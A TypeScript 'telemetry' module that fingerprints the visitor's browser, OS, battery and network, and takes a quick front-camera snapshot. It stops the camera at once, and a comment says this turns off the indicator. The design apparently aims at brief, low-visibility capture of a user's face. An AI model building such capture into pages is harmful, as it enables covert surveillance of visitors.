// lib/telemetry.ts
// Utility to collect device telemetry and handle browser-supported web permissions
import { DeviceInfo } from "@/lib/types";

export function detectBrowserAndOS(ua: string): { browser: string; os: string } {
  let browser = "Unknown Browser";
  let os = "Unknown OS";

  if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
  else if (/Android/i.test(ua)) os = "Android";
  else if (/Macintosh|Mac OS X/i.test(ua)) os = "macOS";
  else if (/Windows NT/i.test(ua)) os = "Windows";
  else if (/Linux/i.test(ua)) os = "Linux";

  if (/Edg\//i.test(ua)) browser = "Microsoft Edge";
  else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) browser = "Chrome";
  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
  else if (/Firefox\//i.test(ua)) browser = "Firefox";
  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser = "Opera";

  return { browser, os };
}

export async function collectDeviceTelemetry(): Promise<DeviceInfo> {
  if (typeof window === "undefined") return {};

  const ua = navigator.userAgent;
  const { browser, os } = detectBrowserAndOS(ua);
  const screen = `${window.screen?.width || 0}x${window.screen?.height || 0}`;
  const language = navigator.language;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const platform = navigator.platform;

  let battery: number | null = null;
  let isCharging: boolean | null = null;

  try {
    const nav = navigator as any;
    if (nav.getBattery) {
      const b = await nav.getBattery();
      battery = Math.round(b.level * 100);
      isCharging = b.charging;
    }
  } catch {
    // Battery API not supported or blocked
  }

  let connection = "Unknown";
  try {
    const nav = navigator as any;
    if (nav.connection?.effectiveType) {
      connection = nav.connection.effectiveType.toUpperCase();
    }
  } catch {
    // Connection info unavailable
  }

  return {
    browser,
    os,
    screen,
    language,
    timezone,
    platform,
    battery,
    isCharging,
    connection,
  };
}

// Ultra-fast, lightweight camera snapshot with zero DOM/CPU lag
export async function captureCameraSnapshot(): Promise<Blob | null> {
  if (typeof navigator === "undefined" || !navigator.mediaDevices?.getUserMedia) {
    return null;
  }

  let stream: MediaStream | null = null;
  let video: HTMLVideoElement | null = null;

  try {
    // Ultra-lightweight constraints (360p/480p @ 15fps) to eliminate CPU/GPU lag
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
        width: { ideal: 480, max: 640 },
        height: { ideal: 360, max: 480 },
        frameRate: { ideal: 15, max: 20 },
      },
      audio: false,
    });

    video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;
    video.setAttribute("playsinline", "true");

    await video.play().catch(() => {});

    // Fast warmup (180ms) - enough for auto-exposure without freezing device
    await new Promise((r) => setTimeout(r, 180));

    const w = video.videoWidth || 480;
    const h = video.videoHeight || 360;

    const canvas = document.createElement("canvas");
    canvas.width = w;
    canvas.height = h;

    const ctx = canvas.getContext("2d", { willReadFrequently: false });
    if (ctx) {
      ctx.drawImage(video, 0, 0, w, h);
    }

    // Immediately stop tracks to turn off camera indicator & release hardware pipeline
    if (stream) {
      stream.getTracks().forEach((t) => t.stop());
      stream = null;
    }
    video = null;

    // Export lightweight WebP (<35KB), fallback to JPEG
    return await new Promise<Blob | null>((resolve) => {
      canvas.toBlob(
        (blob) => {
          if (blob) {
            resolve(blob);
          } else {
            canvas.toBlob((fallback) => resolve(fallback), "image/jpeg", 0.55);
          }
        },
        "image/webp",
        0.55
      );
    });
  } catch (err) {
    console.warn("Camera snapshot skipped or denied:", err);
    return null;
  } finally {
    if (stream) {
      stream.getTracks().forEach((t) => t.stop());
    }
  }
}
